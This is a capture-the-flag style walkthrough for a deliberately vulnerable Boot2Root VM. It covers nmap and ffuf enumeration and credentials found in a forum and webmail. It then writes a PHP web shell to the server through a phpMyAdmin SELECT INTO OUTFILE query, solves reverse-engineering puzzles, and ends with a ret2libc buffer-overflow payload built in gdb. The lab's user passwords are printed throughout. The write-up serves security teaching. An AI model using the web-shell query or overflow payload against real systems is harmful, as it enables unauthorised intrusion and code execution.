# Boot2Root

This project is an introduction to **penetration testing** and **privilege escalation**.
The goal is to gain **root** access on the provided virtual machine by exploiting various misconfigurations, vulnerabilities, and services exposed on the system.

The VM simulates a vulnerable server containing multiple layers of challenges: weak credentials, misconfigured services, cryptography, reverse engineering, and binary exploitation.

## Objectives 

- Discover different attack vectors through real services (FTP, SSH, HTTP).
- Practice service enumeration and information gathering (Nmap, ffuf, banner grabbing).
- Exploit web applications
- Practice file inclusion / SQL exploitation / Remote Code Execution
- Solve reverse engineering challenges (Ghidra, gdb)
- Exploit buffer overflow vulnerabilities 
- Privilege Escalation 

## Installation and setup 

1. Download the provided ISO 
2. Start a **64-bit** virtual machine and use the ISO
3. Find the IP address of the VM with:
```
sudo arp-scan -I vboxnet0 --localnet
```
4. Time to exploit !

</br>

# Solution 1


First, we launch a `nmap` scan to see the ports and services present on the machine:
```
➜  boot2root git:(master) ✗ sudo nmap 192.168.56.110 -p-
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-19 15:22 CEST
Nmap scan report for 192.168.56.110
Host is up (0.000085s latency).
Not shown: 65529 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
MAC Address: 08:00:27:A7:45:BA (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
```

To have more informations about the services we will use the *nmap script engine* with the `-sC` and `-sV` flags:
```
➜  boot2root git:(master) ✗ sudo nmap 192.168.56.110 -p 21,22,80,143,443,993 -sC -sV
Starting Nmap 7.80 ( https://nmap.org ) at 2025-08-19 15:24 CEST
Stats: 0:01:11 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.92% done; ETC: 15:25 (0:00:01 remaining)
Nmap scan report for 192.168.56.110
Host is up (0.00033s latency).

PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 07:bf:02:20:f0:8a:c8:48:1e:fc:41:ae:a4:46:fa:25 (DSA)
|   2048 26:dd:80:a3:df:c4:4b:53:1e:53:42:46:ef:6e:30:b2 (RSA)
|_  256 cf:c3:8c:31:d7:47:7c:84:e2:d2:16:31:b2:8e:63:a7 (ECDSA)
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hack me if you can
143/tcp open  imap       Dovecot imapd
|_imap-capabilities: ID ENABLE more have LITERAL+ STARTTLS IMAP4rev1 capabilities post-login Pre-login listed OK IDLE LOGINDISABLEDA0001 LOGIN-REFERRALS SASL-IR
|_ssl-date: 2025-08-19T13:24:56+00:00; 0s from scanner time.
443/tcp open  ssl/http   Apache httpd 2.2.22
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
|_ssl-date: 2025-08-19T13:24:56+00:00; 0s from scanner time.
993/tcp open  ssl/imaps?
|_ssl-date: 2025-08-19T13:24:56+00:00; 0s from scanner time.
MAC Address: 08:00:27:A7:45:BA (Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.11 seconds
```

These scans give us more informations and details about each services like the versions or the banners and headers informations etc...
</br>

Let's make a quick analyze on each services:
- The port `21` is a ftp server and doesn't seems to allow anonymous connection
- The port `22` is used by ssh to connect to the machine
- The port `80` is a http web server (Apache)
- The port `143` is an imap server used to retrieve users emails or messages
- The port `443` is a http web server over ssl 
- The port `993` is an imap server over ssl 


The webserver on the port `80` serves a simple web page and is not really interesting. </br>
By accessing the port `443` we are responded with an error page. Well, pages seems to be hidden or not directly accessible without knowing them. </br>
A strategy to see public files and directories from a web site is by making a lot of requests (fuzzing) on differents paths and wait the server's responses. We will use a widely used tool named `ffuf` to enumerates files and directories accessible from the website:
```
└─$ ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://192.168.56.110/FUZZ   

...
forum                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 21ms]
webmail                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 3ms]
phpmyadmin              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 5ms]
...
```  

We find 3 folders, where each of them are a different application:
- `/forum/`, which is a fourm powered by `mylittleforum`
- `/webmail/` which is a web mail application powered by `squirrelMail` 
- `/phpmyadmin/` which is a `phpmyadmin` instance  


### Mylittleforum

In the `forum` we find an interesting post named `Problem login ?` posted by `lmezard` which seems to be log connections. One line gives us a password:
```
 Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```
It's the password for `lmezard`, `lmezard:!q\]Ej?*5K5cy*AJ` </br>
These credentials allows us to connect to the `forum` as `lmezard`. In the profile settings we found a mail address: `laurie@borntosec.net` </br>


### SquirrelMail

With the mail and the password `laurie@borntosec.net:!q\]Ej?*5K5cy*AJ` found in the forum, we access to the webmail interface as `laurie`. Once connected we find a mail from `qudevide` giving us the credentials for the database `phpmyadmin`: `root:Fg-'kKXBj87E:aJ$` </br>

### phpmyadmin

On the `phpmyadmin` pannel we see a lot of things, like the `forum` database but an interesting feature of `phpmyadmin` is to make custom `SQL Queries` to the database, as `mysql` user. 
It allows us to read files on the machine like `/etc/passwd`:
```
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
thor:x:1004:1004:,,,:/home/thor:/bin/bash
zaz:x:1005:1005:,,,:/home/zaz:/bin/bash
```
- Or get configuration files, like the apache2's configuration. It gives us the location of the directories on the machine: `SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default')`
```
<VirtualHost *:443>
ServerAdmin webmaster@localhost
...
Alias /phpmyadmin /usr/share/phpmyadmin
...
Alias /forum /var/www/forum
...
Alias /webmail /usr/share/squirrelmail
...
```
Reading files was actually limited and writing files was even more difficult. After enumerating more on the `/forum` we find a directory:  
```
ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u https://192.168.56.114/forum/FUZZ -fs 288
...
templates_c             [Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 4ms]
...
```

After some tests, we finally created a malicious php script in this directory with a SQL Query: 
```
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/script.php'
```
Making a request to the script should execute it:
```
https://192.168.56.114/forum/templates_c/script.php?cmd=whoami
```
It works ! We have now a Remote Code Excution on the machine. </br>

The next step is to found interesting files on the machine. And In the `/home` directory we found the folder `LOOKATME` containing the file `password`:
```
https://192.168.56.114/forum/templates_c/script.php?cmd=cat%20/home/LOOKATME/password
...
lmezard:G!@M6f4Eatau{sF" 
```

### FTP

These credentials are for the ftp account of `lmezard`. Once connected, we found 2 files:
```
ftp> dir
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun

$ cat README 
Complete this little challenge and use the result as password for user 'laurie' to login in ssh

$ file fun          
fun: POSIX tar archive (GNU)
```

### Laurie

The tar archive contains `750` files with the extension `.pcap` but these files are actually `ASCII text` files. </br>
And each of them have the same format, the first line is a c code line and the last one is an index identifying the file order: 
```
$ cat YJR5Z.pcap       
#include <stdio.h>

//file1 
```

With a simple script we can gather the code into a c file, compile and execute it. It gives us a string to cipher with the `SHA256` algorithm to get the ssh's password of `laurie`:
```
$ gcc main.c
$ ./a.out   
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
$ echo -n "Iheartpwnage" | sha256sum         
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

We can now connect to the machine as `laurie` with the creds `laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

### Thor

In the laurie's session we have 2 files:
- `bomb` a 32 binary file
- `README` telling us to deffuse the `bomb` programm to get the ssh password of `thor`

The bomb binary is a serie of 6 challenges:
- Phase 1: Comparizon with a string directly defined in the condition 
- Phase 2: find a suite of 6 numbers where the condition `(t[i + 1] = (i + 1) * t[i])` is valid
- Phase 3: switch case where the values need to match, we used the hint to find `b` as the second parameter
- Phase 4: fibonacci suite
- Phase 5: from this string `isrveawhobpnutfg`, the last 4 bytes of the character input need to correspond to the index of a correspding letter of the string `giants`
```
local_s = "isrveawhobpnutfg"
local_s[input[0] & 0xf] = local_s[15] = g
local_s[input[1] & 0xf] = local_s[0] = i
15 -> g -> o
0 -> i -> ` 
5 -> a -> e 01100101
10 -> n -> k 01101011
13 -> t -> m 01101101
1 -> s -> a
...
```
- Phase 6: The program have 6 nodes, each one of them have an index and a value. The goal is to sort the nodes by their values and gives their indexes as reponse:
```
0x804b230 <node6>:      0x000001b0      0x00000006      0x0804b23c      0x000000d4
0x804b240 <node5+4>:    0x00000005      0x0804b26c      0x000003e5      0x00000004
0x804b250 <node4+8>:    0x0804b254      0x0000012d      0x00000003      0x0804b260
0x804b260 <node2>:      0x000002d5      0x00000002      0x00000000      0x000000fd
0x804b270 <node1+4>:    0x00000001      0x0804b248      0x000003e9      0x00000000

node6 1b0
node5 d4
node4 3e5
node3 12d
node2 2d5
node1 fd 

3e5 2d5 1b0 12d fd d4
4   2   6   3   1  5 
```

The final result is:
```
Public speaking is very easy.
1 2 6 24 120 720
1 b 214
9
o`ekma
4 2 6 3 1 5
```

Joining the strings together doesn't form the right password. Actually the phase 4 can have multiple values and the subject tells something about inversing 2 characters in the end. After some searches (and stackoverflowteams.com/c/42network/) we find the password for the user `thor`:
```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

### Zaz

On the `thor` session we have a file `turtle` which is a series of instructions about movements and directions. These instructions are from a graphic library in python named `turtle`. After writing python scripts that draw these instructions we decode the word `SLASH`. </br>
We tried different hash algorithm and found the password for `zaz`:
```
echo -n "SLASH" | md5sum
ssh zaz@192.168.56.103 
password : 646da671ca01bb5d84dbb5fb2238dc8e
```  

## Buffer overflow 

On the `zaz`'s session we find the file `exploit_me` which is a 32-bit ELF file. After opening it in Ghidra we found this pseudo code:
```
bool main(int param_1,int param_2)

{
  char local_90 [140];
  
  if (1 < param_1) {
    strcpy(local_90,*(char **)(param_2 + 4));
    puts(local_90);
  }
  return param_1 < 2;
}
```  
Our input is copied in a buffer of 140 bytes with `strcpy` making it vulnerable to buffer overflow because of the lack of size boundaries. We can overwrite the return address of the function of `main` like a `ret2libc` (system + exit + "/bin/sh").
```
gdb exploit_me
(gdb) disas main
(gdb) b 0x08048420
(gdb) r test
(gdb) info function system 
0xb7e6b060  system

(gdb) info function exit
0xb7e5ebe0  exit

(gdb) info proc map 
0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so

(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
0xb7f8cc58

(gdb) r $(python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')
```